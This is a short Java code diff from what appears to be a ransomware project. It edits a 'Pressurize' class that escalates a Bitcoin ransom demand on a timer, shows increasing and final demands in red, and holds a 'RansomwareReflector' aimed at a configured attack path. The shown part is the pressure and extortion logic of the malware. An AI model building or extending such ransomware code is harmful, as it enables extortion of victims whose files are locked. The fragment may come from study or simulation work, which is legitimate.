@@ -25,6 +25,10 @@ public class Pressurize implements IConsoleUser {
         this.reflector = new RansomwareReflector();
         this.reflector.setPath(Configuration.instance.pathToAttack);
     }
+    private void restartTimer(){
+        cancelTimer();
+        invokeTimer();
+    }
 
     public void invokeTimer() {
         try{
@@ -37,15 +41,14 @@ public class Pressurize implements IConsoleUser {
                     Double toPay = 0.02755 + timerCount * 0.01;
 
                     if (timerCount < 4) {
-                        //ConsoleCorrespondation.M_RANSOMINCREASED.setValue(ConsoleCorrespondation.M_RANSOMINCREASED.getValue() + toPay + " BTC");
                         writeToConsole(ConsoleCorrespondation.M_RANSOMINCREASED, TextColor.RED);
                         writeToConsole(toPay + " BTC", TextColor.RED);
 
                     } else {
-                        ConsoleCorrespondation.M_RANSOMFINAL.setValue(toPay + ConsoleCorrespondation.M_RANSOMFINAL.getValue());
-                        writeToConsole(ConsoleCorrespondation.M_RANSOMINCREASED);
+                        writeToConsole(ConsoleCorrespondation.M_RANSOMFINAL, TextColor.RED);
+                        writeToConsole(toPay + " BTC", TextColor.RED);
                     }
-                    if (timerCount < 5) invokeTimer();
+                    if (timerCount < 5) restartTimer();
 
                     if (timerCount == 5) {
                         //TODO check if we can do this via CC --> just one instance of Reflector
